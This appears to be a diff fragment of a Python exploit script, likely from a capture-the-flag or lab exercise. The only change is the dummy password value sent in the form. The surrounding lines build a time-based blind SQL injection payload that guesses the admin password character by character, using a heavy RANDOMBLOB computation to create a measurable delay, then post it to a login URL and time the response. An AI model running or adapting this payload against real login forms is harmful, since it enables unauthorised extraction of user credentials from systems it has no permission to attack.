@@ -238,7 +238,7 @@ while True:
         query_pass = f"v' OR 5407=(case when substr((select password from users where username='admin'), {post}, 1) = '{c}' then (like('ABCDEFG', UPPER(HEX(RANDOMBLOB(200000000/2))))) else 5407 end)-- -"
         payload = {
             'username': query_pass,
-            'password': 'vanir'
+            'password': 'adadadadadada'
         }
         start = time.time()
         r = s.post(url, data=payload)
